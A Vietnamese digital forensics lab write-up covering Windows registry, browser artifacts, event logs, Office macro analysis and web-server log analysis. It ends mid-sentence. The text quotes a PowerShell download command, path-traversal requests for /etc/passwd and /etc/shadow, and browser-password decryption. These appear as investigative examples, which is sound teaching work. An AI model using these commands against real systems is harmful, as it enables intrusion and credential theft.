# Digital-forensics-lab
--- 
## Common Windows Artifacts.
Trong hệ điều hành Windows thì nó chứa đựng lượng lớn các dấu vết bao gồm: các thư mục, các files, logs, registry, lịch sử browser, tài khoản người dùng và rất nhiefu những dữ liệu quan trọng khác rất cần thiết, để hoạt động đúng cách.
## Windows Registry
- Là một hệ thống phân cấp cơ sở dữ liệu, mà ở đó lưu trữ những cấu hình cho người dùng bao gồm ứng dụng và phần cứng thiết bị.
- Windows Registry nó bao gồm 5 cái khóa gốc chính , được hiểu là các hives đó là:
    - HKEY_CURRENT_USER (HKCU): hives này chứa các thông tin về nhật ký của người dùng bao gồm màu màn hình và cài đặt control panel.
    - HKEY_USER (HKU): hives này chứa toàn bộ thông tin hồ sơ người dùng hiện có trên máy tính.
    - HKEY_LOCAL_MACHINE (HKLM): hives này chứa các thông tin về cấu hình hệ thống.
    - HKEY_CLASSESS_ROOT (HKCR): hives này chứa các thông tin về các loại files và các chương trình liên quan của họ.
    - HKEY_CURRENT_CONFIG (HKCC): hives này chứa thông tin về hồ sơ phần cứng của hệ thống.
- Mỗi một khóa này sẽ chứa những khóa con phân cấp và giá trị lưu trữ những thông tin cụ thể của hệ thống và cấu hình của nó. Lấy vị dụ thì cấu hình của con chuột, như là độ nhạy và double click speed sẽ được lưu trữ bên trong Computer\HKEY_CURRENT_USER\Control Panel\Mouse . Chúng ta có thể nhận dạng nó
  dưới dạng cây như sau:
<img width="1629" height="224" alt="image" src="https://github.com/user-attachments/assets/5e4f9367-05c6-4b8d-b741-a5ba145c1651" />

- Khóa Registry có thể được xem và chỉnh sửa bên trong Registry Editor - một công cụ được phát triển bởi Windows Microsoft. Mở bằng Windows + R regedit

<img width="1258" height="639" alt="regedit" src="https://github.com/user-attachments/assets/483bc0b0-1f57-4cc8-8c2c-d58a5313c686" />
<img width="2847" height="1522" alt="image" src="https://github.com/user-attachments/assets/6d64ae7e-c384-483f-89b8-36f035294b11" />

## NTUSER.DAT
- Files NTUSER.DAT là một hồ sơ người dùng hive, nó là một phần của registry. Mỗi người dùng được lưu trữ bên trong `C:\Users\%USERNAME%\NTUSER.DAT`.
- Nội dung của file NTUSER.DAT có thể được xem bằng công cụ Registry Explorer bởi Eric Zimmerman:
    - Công cụ có thể được tải bằng đường link https://ericzimmerman.github.io/#!index.md.
<img width="1874" height="960" alt="image" src="https://github.com/user-attachments/assets/19b0b6eb-9fa0-40c0-8a76-54a4c952b5a4" />

### LNK Files
- Files LNK là một file shortcut mà nó cho phép truy cập một cách nhanh chóng vào các files, folder, hoặc các chương trình của hệ thống được sử dụng một cách thường xuyên. Những files này thường có phần mở rộng là `.lnk` và có thể được tìm thấy ở những nơi như desktop, start menu, và thư mục tài liệu gần đây.
- Bất cứ khi nào một file được truy cập lần đầu tiên, file `.lnk` được tạo trong Recent folder. Những thông tin này là một phần hữu ích trong việc xác minh các file vừa được truy cập.
- Những files đó có thể được tìm thấy ở trong

+ `C:\Users\%USERNAME%\Recent`
+ `C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent`
+ `C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Office\Recent`
+ `C:\Users\%USERNAME%\Desktop`

- Có một cách để khám phá file LNK và giải nén ra những thông tin hữu ích từ nó là sử dụng một công cụ gọi là LECmd. Chúng ta có thể sử dụng nó để giải nén đầy đủ đường dẫn gốc của một file, ngày và giờ file được tạo, sửa đổi mới nhất, lần truy cập gần nhất, desktop name và địa chỉ MAC.
- Tools có thể được tải từ: https://github.com/EricZimmerman/LECmd
<img width="2555" height="1309" alt="image" src="https://github.com/user-attachments/assets/7e4839e5-de7d-47fd-87c1-2f48e26eb667" />

### Web Browsers

- Trình duyệt web được sử dụng rộng rãi trên toàn cầu. Trong bối cảnh của digital forensics, trình duyệt web cung cấp rất nhiều những thông tin về lịch sử trình duyệt người dùng, cookies, file downloads, mật khẩu được lưu, và nhiều hơn. Những thông tin này có thể được dùng để xác minh cái mà người dùng vừa ở đó, xác minh bất cứ hành động bất thường nào.
- Có rất nhiều trình duyệt web, nhưng tạm thời chúng ta chỉ đề cập đến Firefox và Chrome.
--- 
1. Firefox
   - Firefox lưu trữ dữ liệu mà có thể nó có giá trị trong quá trình điều tra digital forensics trong thư mục `C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles`. bao gồm cookies, lưu thông tin đăng nhập, lịch sử trình duyệt và những thông tin khác về `.sqlite` và `.json`
   - Để xem được 1 file `.json` chúng ta có thể sử dụng bất cứ phần mềm text-editor nào.
   - Nhưng để xem nội dung của file `.sqlite` chúng ta cần một công cụ đặc trưng đó là: `Sqlitebroswer`

      `sqlitebrowser places.sqlite`
2. Save Login
   - Firefox mã hóa để lưu lại những lần đăng nhập sử dụng master key bên trong file `key4.db` được nằm ở trong hồ sơ của thư mục. Để giải nén tên người dùng và passwords, chúng ta có thể sử dụng một công cụ gọi là `firefox_encrypt` có thể được tải từ: https://github.com/unode/firefox_decrypt
   - Cách để tải tools đó về: 

          $ git clone https://github.com/unode/firefox_decrypt 
          Cloning into 'firefox_decrypt'...
          remote: Enumerating objects: 1163, done.
          remote: Counting objects: 100% (275/275), done.
          remote: Compressing objects: 100% (40/40), done.
          remote: Total 1163 (delta 250), reused 238 (delta 233), pack-reused 888
          Receiving objects: 100% (1163/1163), 414.55 KiB | 1.14 MiB/s, done.
          Resolving deltas: 100% (732/732), done.

           $ python3 firefox_decrypt.py hxdvwqnb.default-release 

          Website:   https://www.facebook.com
          Username: 'john.doe@example.com'
          Password: 'my_password123'
          
          Website:   https://twitter.com
          Username: 'john_doe'
          Password: 'my_twitter_password123'
          
          Website:   https://google.com
          Username: 'john.doe@gmail.com'
          Password: 'some_random_p4ssw0rd'
  3. Chrome
     - Chrome thì nó lưu trữ dữ liệu bao gồm mật khẩu được lưu, cookies và một số những thông tin hữu ích bên trong thư mục sau `C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default`. Những dữ liệu được mã hóa theo default, nhưng chìa khóa thì có thể được tìm thấ bên trong thư mục sau `C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State`
  4. Event Logs
     - Event logs cung cấp một đoạn ghi vô cùng quan trọng cho hệ thống, bảo mật và các events của ứng dụng. Những logs này sẽ được tạo một cách tự động bởi Windows. và có thể cung cấp những thông tin có giá trị trong suốt quá trình điều tra.
     - Event logs được lưu trữ bên trong thư mục `C:\Users\System32\winevt\Logs` và có thẻ xem và phân tích bằng cách sử dụng Event Viewer, một công cụ được tạo bởi windows.
     - Có 3 dạng chính của Event logs của windows là system, security, application thì trong đó chúng ta chỉ quan tâm đến security là chủ yếu. The logs file có thể chứa đựng những thông tin sau:
        - `Security.evtx`
        - `Microsoft-Windows-Windows Defender%4Operational.evtx`
        - `Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx`
        - `Microsoft-Windows-Powershell%4Operational.evtx`
      - Mỗi một event trong event logs đều có 1 con số đặc trưng cho event đó và chúng ta có một vài ví dụ như:
        
        <img width="858" height="620" alt="image" src="https://github.com/user-attachments/assets/67eb1545-0bba-4e58-ab2c-01f003204e4c" />

      - Here’s an example of event ID 1117 in the file Microsoft-Windows-Windows Defender%4Operational.evtx, viewed using the built-in Event Viewer
        <img width="1707" height="1181" alt="image" src="https://github.com/user-attachments/assets/2438513c-9ade-47d2-a5fb-1794fc79ad99" />




# Exercise
## 1. Sử dụng file registry của một hệ thống đã bị xâm nhập, và trả lời
### i.  mouse double-click speed : 500
### ii. The most recent typed path accessed as recorded in the registry is: 

`C:\Windows\System32\calc.exe`. Bởi vì recent typed path accessed là đường dẫn gần đây nhất mà người dùng nhập trên thanh (addressed bar) của File Explorer 
<img width="3821" height="2088" alt="image" src="https://github.com/user-attachments/assets/52f83668-6cfd-4efe-8639-40de478d7885" />

### iii. The new value added to the registry by the malware in order to establish persistence over the system?
  Bởi vì kẻ tấn công muốn thiết lập sự duy trì của malware trong hệ thống của người dùng một cách lâu dài, thì 1 trong số những khả năng mà kẻ tấn công có thể đặt malware đó chỉnh là trong phần `HKCU\SoftWare\Microsoft\Windows\CurrentVersion\Run\RunOnce` trong thư mục này thì mỗi lần khởi động máy tính thì malware sẽ đều được kích hoạt đảm bảo cho nó được tồn tại lâu dài trong hệ thống

<img width="3832" height="2159" alt="image" src="https://github.com/user-attachments/assets/5ff6a2a5-18ea-4c6b-90d2-15649df00e8a" />
<img width="2415" height="631" alt="image" src="https://github.com/user-attachments/assets/8fe1330c-2b5c-47cb-abe8-c1b178780c11" />

Đây là vị trí giá trị mà malware được thêm vào

## 2. Given the Firefox profile of a suspect, answer the following:
### i. What’s the username and password stored in the saved logins
Đầu tiên chúng ta cần phải biết là, các phần thuộc về credentials information đều bị Firefox chuyển hóa thành dạng không thể đọc được để tăng tính bảo mật trong file `login.json`, thế nên để đọc được username và password thì chúng ta cần sử dụng một công cụ đó gọi là **Firefox_Decrypt** được build sẳn trên github, đầu tiên chúng ta cần thực hiện thao tác tải về bằng lệnh:
```
git clone https://github.com/unode/firefox_decrypt 
Cloning into 'firefox_decrypt'...
remote: Enumerating objects: 1163, done.
remote: Counting objects: 100% (275/275), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 1163 (delta 250), reused 238 (delta 233), pack-reused 888
Receiving objects: 100% (1163/1163), 414.55 KiB | 1.14 MiB/s, done.
Resolving deltas: 100% (732/732), done.
```
Sau đó chúng ta chỉ cần chay lệnh firefox_decrypt là sẽ thấy được username và password trong file `login.json`
<img width="1908" height="438" alt="Screenshot 2025-11-21 151852" src="https://github.com/user-attachments/assets/9936300b-8814-4e0b-ab2b-989e6bb90a05" />

### ii. What’s the most frequently visited website?
Để tìm được trang web mà người dùng truy cập vào nhiều nhất, chúng ta có thể sử dụng 2 cách:
- Cách đầu tiên là dùng phần Browser Data của sqlitebrowser để thực hiện xem phần moz_places và tìm kiếm phần visitcount để suy ra được mục mà người dùng xem nhiều nhất như sau
  <img width="1912" height="1035" alt="Screenshot 2025-11-18 233111" src="https://github.com/user-attachments/assets/fa599986-9be7-4173-af40-5a5910901ad1" />

  Đầu tiên vào **places.sqlite**, đây là nơi chúng ta sẽ thực hiện xem các thông tin mà liên quan đến người dùng nhiều nhất.
  Sau đó vào phần **Browser Data**
  <img width="1386" height="916" alt="Screenshot 2025-11-18 234602" src="https://github.com/user-attachments/assets/357fc607-b2ea-4d7a-9bc4-a8bace267715" />

  ở đây chúng ta sẽ thấy được visitcount vào trang web https://amazon.com là nhiều nhất với nhiều lần truy cập trang web đó.
- Cách thứ 2 là dùng Execute SQL để thực hiện chay nhanh hơn.
  Đầu tiên di chuyển qua ô Execute SQL cùng hàng với mục Browser Data.
  <img width="3838" height="1723" alt="image" src="https://github.com/user-attachments/assets/63d01638-01e7-4b72-87c9-71ecfc8bda46" />

  Chạy lệnh Execute SQL sau:
  ```
  SELECT 
    url, 
    title, 
    visit_count
    FROM moz_places 
    ORDER BY visit_count DESC 
    LIMIT 10;
  ```
  Vậy chúng ta cũng có thể xác định được trang web được truy cập qua cách này
### iii. What’s the name of the file downloaded by the suspect?
Tương tự như trên thì chúng ta sẽ chạy 1 lệnh trong Execute SQL để tìm ra được file đã download về
<img width="1371" height="978" alt="Screenshot 2025-11-18 235528" src="https://github.com/user-attachments/assets/a58c5b66-d7fd-45c7-b000-9c677f82eb11" />

<img width="3839" height="1248" alt="image" src="https://github.com/user-attachments/assets/e15c99ab-a9bb-407a-9ab0-b000e92eaea5" />

Khi dùng Browser Data chúng ta cũng sẽ thấy có một đường dẫn của https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe
Vậy file được tải về chinh là python-3.11.1-amd64.exe

## 3. Given the PowerShell Event logs of a compromised system, answer the following:
### i. What’s the command executed by the attacker to download a file on the system?
Trong bài này, chúng ta được đề cung cấp cho 1 file event được PowserShell, tức là kẻ tấn công đã dùng các lệnh độc để cố gắng cài mã độc vào hệ thống. Đầu tiên khi mở file SaveLog của PowerShellevent lên thì chúng ta có thể thấy được có 1 event xuất hiện lệnh prompt được mở lên.
<img width="1306" height="674" alt="Screenshot 2025-11-19 134524" src="https://github.com/user-attachments/assets/66ba890a-d8c0-468d-871e-45490641566d" />

Sau đó khi tìm các event sau chúng ta có thể thấy được 1 event rất đáng ngờ như sau.
<img width="1299" height="665" alt="Screenshot 2025-11-19 142025" src="https://github.com/user-attachments/assets/1cee9700-9b4a-40f2-bbe1-8a6e48aaac3e" />

Đây dường như là một lệnh cài đặt 1 cái gì đó về máy từ internet. Chúng ta sẽ phân tích câu lệnh này qua từng phần nhỏ
`Invoke-WebRequest -UseBasicParsing -Uri ... -OutFile "file.ps1"` đầu tiên đây là câu lệnh tìm thấy bên trong event. chia nhỏ nó ra thành từng phần để hiểu hơn
    - `Invoke-WebRequest`: (viết tắt là wget - iwr) đây là lệnh yêu cầu máy tính gửi một request HTTP ra ngoài internet, để tải về một tệp gì đó trong trường hợp này.
    - `-UseBasicParsing`: tham số này bảo PowerShell dùng bộ phận phân tích cơ bản nhất, bỏ qua Internet Explorer engine. Nó thường được dùng trong các script của các hacker dùng để tránh lỗi không tương thích với máy chủ, hoặc máy không có giao diện GUI để có thể đảm bảo lệnh chạy mượt mà nhất.
    - `-URI https://www.google.com/search?q=raw.githubusercontent.com//Lab 2/files/file.ps1` đây là địa chỉ nguồn trên internet.Kẻ tấn công dường như đang tải một file độc hại từ github về
    - Cuối cùng lệnh Output sẽ lưu file được tải vào "file.ps1"
### ii. Can you analyze the downloaded file and understand what’s the purpose of that file?
File được tải về là `file.ps1`, giờ hãy xem nội dung của file ấy là gì.
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/5da4372f-ffde-4ce9-994b-655d7f10105c" />

```
$data = "SGVsbG8sIHVzZSBmbGFne2V2M250X2wwZ3NfZjByX3RoM193MW59IGFzIHRoZSBhbnN3ZXIgdG8gdGhlIG9yaWdpbmFsIHF1ZXN0aW9uLg=="
$flag = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
Write-Output $flag
```
Đây là nội dung của file khi được tải về. Ở đây chúng ta có 1 biến data dường như nó đã được mã hóa theo dạng base64 theo những kí tự in hoa, in thường, số, và dấu bằng đặc trưng ở cuối, tiếp đó là biến flag cho thấy lệnh được giải mã ra và ghi output nó vào biến flag mới. Vậy ở đây chúng ta chỉ cần tập trung vào biến data với nội dung mã hóa là gì.
Đây là nội dung của đoạn base64 sau khi decode ra:
<img width="1721" height="937" alt="image" src="https://github.com/user-attachments/assets/490a99c4-96c6-49b5-bf22-f52aa76e3e72" />

Vậy Flag là: flag{ev3nt_l0gs_f0r_th3_w1n}

# Document Analysis and Steganography
Tài liệu là một cách phổ biến để gửi và lưu trữ các thông tin như là tin nhắn, báo casco, videos, hoặc là các ý tưởng. MS Office documents, Images và audio files là các format mà chúng ta sử dụng phổ biến nhất qua mỗi ngày. Tuy nhiên, Bên cạnh những gì chúng ta viết trong tài liệu word hoặc nghe từ các file audio, thì những tài liệu trên còn có thể chứa đựng các tin nhắn ẩn, hoặc các đoạn code độc hại, và có thể thực thi khi chúng ta mở nó lên. Trong lab này chúng ta sẽ khám phá các kỹ thuật để phân tích và luyện tập với tài liệu trên.
# Microsoft Office Documents
Có 2 loại format file chính được sử dụng bởi Microsoft Office documents:
- OLE (Object Linking and Embedding)
- OOXML (Office Open XML)
## OLE(Object Linking and Embedding)
OLE là một format file được sử dụng trong các phiên bản đầu tiên như Microsoft Office giữa 1997 và 2003. Nó được định nghĩa là "file within a file" tức là sẽ có 1 file khác bên trong 1 file cấu trúc này cho phép có thể nhúng 1 file khác bên trong 1 file.Lấy ví dụ là 1 trang Excel bên trong 1 trang pdf Word.
Nó hỗ trợ cho file có phần mở rộng như: `.rtf`, `.doc`, `.ppt`, và `.xls` hoặc hơn.
## OOXML(Office Open XML)
OOXML là loại format file được sử dụng cho các phiên bản Micorsoft Office hiện tại, cái được dựa trên XML - là loại format dựa trên office document.
Phần mở rộng của tài liệu này bao gồm `.docx`, `.pptx`, và `.xlsx` và các cái khác.
Phần quan trọng khác là format của OOXML là được lưu trữ tài liệu dưới dạng Container ZIP. Có nghĩa là những tài liệu như Word.Excel,PPt, là một file zip. Bằng cách thay đổi tên của nó từ `.docx`, `.xlsx` hoặc `.pptx` thành `.zip`, bạn có thể giải nén các nội dung của tệp và xem phần bên trong của XML files. Điều này có ý nghĩa rất lớn trong pháp y kĩ thuật số, nó cho phép các nhà điều tra có thể phân tích nội dung của tài liệu mà không phải thay đổi nó.
## Giải phẫu tài liệu OOXML(Word Document - Docx)
Khi giải nén một tài liệu `.docx`, chúng ta thu được một cấu trúc thư mục tiêu chuẩn, nơi mỗi thành phần(văn bản, hình ảnh, cài đặt) được lưu trữ trong cái file XML riêng biệt.
Cấu trúc thư mục ví dụ:
```
$ unzip Doc1.docx                       
Archive:  Doc1.docx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: word/document.xml       
  inflating: word/_rels/document.xml.rels  
  inflating: word/theme/theme1.xml   
  inflating: word/settings.xml       
  inflating: word/styles.xml         
  inflating: word/webSettings.xml    
  inflating: word/fontTable.xml      
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```
Đây là cấu trúc của 1 file Word document trông như thế này:
```
.
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   └── core.xml
├── _rels
│   └── .rels
└── word
    ├── document.xml
    ├── fontTable.xml
    ├── _rels
    │   └── document.xml.rels
    ├── settings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    └── webSettings.xml
```
### [Content-Typed].xml
File này chứa đựng những thông tin về loại nội dung hiện có trong tài liệu và phần mở rộng tập tin tương ứng của họ.
### 📂 docProps
Folder này chứa đựng 2 files chính là: **core.xml** và **app.xml**
- `app.xml` - chứa thông tin về các ứng dụng được sử dụng để tạo nên document trên.
```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <Template>Normal.dotm</Template>
  <TotalTime>0</TotalTime>
  <Pages>1</Pages>
  <Words>1</Words>
  <Characters>12</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>1</Lines>
  <Paragraphs>1</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>12</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HyperlinksChanged>false</HyperlinksChanged>
  <AppVersion>16.0000</AppVersion>
</Properties>
```
- `core.xml` - chứa các thông tin metadata của các tài liệu, như là author's name, ngày tạo, ngày sửa gần nhất.
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <dc:title/>
  <dc:subject/>
  <dc:creator>Saad Javed</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Saad Javed</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-02-04T15:44:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-02-04T15:44:00Z</dcterms:modified>
</cp:coreProperties>
```
### 📂 _rels
Folders này chứa những tên file như `.rels`
- `.rels` - chứa các thông tin về các mối quan hệ giữa các phần khác nhau trong tài liệu như à `app.xml` và `core.xml`.
### 📂 word
Folder này chứa những nội dung hiện có của tài liệu.
- `document.xml` - chứa những đoạn text hiện tại của tài liệu.
```xml 
<!-- SNIP -->
  <w:body>
    <w:p w14:paraId="68F74602" w14:textId="442B891B" w:rsidR="00D473D4" w:rsidRPr="00B20485" w:rsidRDefault="00B20485">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Hello World!</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00D473D4" w:rsidRPr="00B20485">
      <w:pgSz w:w="11906" w:h="16838"/>
      <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="708" w:footer="708" w:gutter="0"/>
      <w:cols w:space="708"/>
      <w:docGrid w:linePitch="360"/>
    </w:sectPr>
  </w:body>
</w:document>
```
- `fontTable.xml` - chứa những thông tin về font được sử dụng bên trong tài liệu.
- **📂 _rels —** chứa 1 file `document.xml.rels`
    - `document.xml.rels` - chứa những thông tin về các mối quan hệ giữa các phần khác nhau trong tài liệu, như là styles, themes, settings và các URIs cho các link bên ngoài.
- `setting.xml` - chứa các cài đặt của tài liệu và cấu hình thông tin.
- `styles.xml` - chứa thông tin về styles sử dụng trong tài liệu.
-  **📂 theme —** chứa các file về theme được sử dụng trong tài liệu
    - `theme1.xml` - chứa các theme hiện có trong nội dung.
- `webSettings.xml` - chứa thông tin về các cài đặt cụ thể của web cho tài liệu, như là khung cài đặt HTML và cũng nhuwlamf thế nào mà tài liệu có thể xử lí khi lưu một HTML.
## Macro-Enabled Documents
Macro-Enabled documents là tài liệu chứa macro, cái có thể thiết lập nên các hướng dẫn để hoàn thành các tác vụ một cách tự động. Macros có thể được viết bởi Visual Basic for Applications (VBA) và có thể được sử dụng để thực hiện nhiều tác vụ cùng lúc. như là formating text, thực hiện tính toán và tự động hóa các tiến trình phức tạp. Tuy nhiên, những kẻ tấn công cũng thường sử dụng tiện ích của chức năng cho Office document với phishing attack và nhúng các macros độc hịa và để thực hiện các hành động độc hại và tải malware về.

Phần mở rộng của tài liệu này bao gồm `.docm`, `.pptm` và `.xlsm` và hơn nữa.

Để lấy ví dụ, chúng ta hãy tạo ra một tài liệu trống và theo các bước sau.
1. Nhấn vào View -> Macros -> View macros.
<img width="405" height="224" alt="image" src="https://github.com/user-attachments/assets/830d834e-6141-4a69-be56-ca1fcceb03a8" />

2. Đặt cho nó cái tên vdu HelloWorld. chọn vào Document1 (document hiện tai) bên dưới Macros in và chọn create.
<img width="445" height="362" alt="image" src="https://github.com/user-attachments/assets/ca58a798-126f-4482-9a19-73a25af921da" />

3. Dán vào trong ô đó đoạn code sau:
```
Sub HelloWorld()

Dim doc As Document
Set doc = Word.ActiveDocument
doc.Content.InsertAfter ("Hello, World!")

End Sub
```
<img width="872" height="538" alt="image" src="https://github.com/user-attachments/assets/634e4569-121b-4db2-a6a3-e6fff943f98d" />

4. Đóng Microsoft Visual Basic for Application tab.
5. Lặp lại bước 1 và chọn vào HelloWorld macro và nhấn vào chạy.
6. Hiện thì `Hello, World` đã được viết trong tài liệu.
7. Lưu trong tài liệu tại `.docm`
Theo việc giải phẫu OOXML file, thì macro hiện được lưu trữ bên trong word/vbaProject.bin, tuy nhiên, chúng ta sẽ không thể đọc được nó vì nó ở dạng nhị phân. Nhưng, chúng ta có thể sử dụng một tập hợp các tools gọi là oletools để phân tích các macros từ OLE files.
Để tải được tools thì chúng ta sử dụng lệnh `sudo -H pip install -U oletools`.
và bây giờ sẽ sử dụng `oleid` để xem những thứ được nhúng bên trong:
```
$ oleid HelloWorld.docm   
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: HelloWorld.docm
WARNING  For now, VBA stomping cannot be detected for files in memory
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Word 2007+ Macro-|info      |                          
                    |Enabled Document    |          |                          
                    |(.docm)             |          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OpenXML             |info      |Container type            
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes                 |Medium    |This file contains VBA    
                    |                    |          |macros. No suspicious     
                    |                    |          |keyword was found. Use    
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.       
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```

Trong kết quả chúng ta thấy được rằng nó kêu chúng ta sử dụng olevba để xem xét cái macro bên trong 
```
$ olevba HelloWorld.docm
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.10.8 - http://decalage.info/python/oletools
===============================================================================
FILE: HelloWorld.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub HelloWorld()

Dim doc As Document
Set doc = Word.ActiveDocument
doc.Content.InsertAfter ("Hello, World!")

End Sub
No suspicious keyword or IOC found.
```
# Web Attack Forensics
Ứng dụng web là một phần không thể thiếu trong cuộc sống hiện nay và đã được sử dụng cho đa 

# Exercise Web Application Forensics
### 1. What IP address does the attack seem to be originating from?
Chúng ta sử dụng lệnh `cat error.log | grep -i "sqli"` để liệt kê ra hết những log ghi lại quá trình kẻ tấn công thực hiện cuộc tấn công sql injection nếu có, và trong lần đầu kiểm tra xem kẻ tấn công sử dụng kiểu tấn công nào thì chúng ta đã có kết quả:
<img width="1911" height="475" alt="image" src="https://github.com/user-attachments/assets/f7c59017-412b-4858-9b2c-8a923f0e3842" />

Thấy dòng client di kèm theo 1 địa chỉ ip: **192.168.0.106** cùng với tags: "attack-sql" chúng ta có thể rút ra kết luận đây là một request sử dụng sql injection tấn công.
### 2. Which vulnerabilities do you think are being exploited, and what evidence do you have to support your findings?
Để biết được cách tấn công của attacker sử dụng để khai thác trang web, chúng ta sẽ đọc phần `access.logs` để biết được hắn đã thực thi những lệnh gì bằng lệnh `cat access.logs`
<img width="1910" height="798" alt="image" src="https://github.com/user-attachments/assets/56378b35-eb67-45f4-bfaa-9e881dff13b0" />

Qua output chúng ta sẽ thấy được các dòng 
```
192.168.0.106 - - [16/Feb/2023:01:35:27 +0500] "GET /view.php?image=../../../../etc/passwd HTTP/1.1" 200 650 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.106 - - [16/Feb/2023:01:35:30 +0500] "GET /view.php?image=../../../../etc/shadow HTTP/1.1" 200 202 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.106 - - [16/Feb/2023:01:35:39 +0500] "POST /command.php HTTP/1.1" 200 1143 "http://192.168.0.101:9090/command.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.106 - - [16/Feb/2023:01:36:07 +0500] "GET /database.php HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.106 - - [16/Feb/2023:01:37:49 +0500] "GET /view.php?image=../../../../../../../../../important_note.txt HTTP/1.1" 200 501 "http://192.168.0.101:9090/images.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.106 - - [16/Feb/2023:01:36:19 +0500] "POST /users.php HTTP/1.1" 200 1115 "http://192.168.0.101:9090/users.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.106 - - [16/Feb/2023:01:38:53 +0500] "GET /users.php HTTP/1.1" 200 1117 "-" "sqlmap/1.6.11#stable (https://sqlmap.org)"
```
Chúng ta đã lọc ra những logs quan trọng nhất, và hãy bắt đầu phân tích từng log một để có thể hiểu hơn về intent của kẻ tấn công và hắn đã làm được gì:
- Dòng log đầu tiên và thứ 2 chúng ta thấy hắn đã thành công khai thác lỗ hổng **Path traversal** để tải về máy hắn về được 2 dữ liệu quan trọng là /etc/passwd và /etc/shadow, 
    - `/etc/passwd`: ở đây chứa các thông tin về danh sách người dùng, thông tin chung của các người dùng.
    - `/etc/shadow`: chứa các thông tin về mật khẩu của đã băm của các root và các user khác.
    => Khi kẻ tấn công lấy được 2 thứ này, hắn có thể sử dụng các công cụ bẻ khóa (crack) các hàm băm này và lấy mật khẩu.
- Dòng log thứ 3 kẻ tấn công đã thành công khai thác lỗ hổng RCE(Remote Control Execution) và upload lên server một file command.php mà chúng ta  
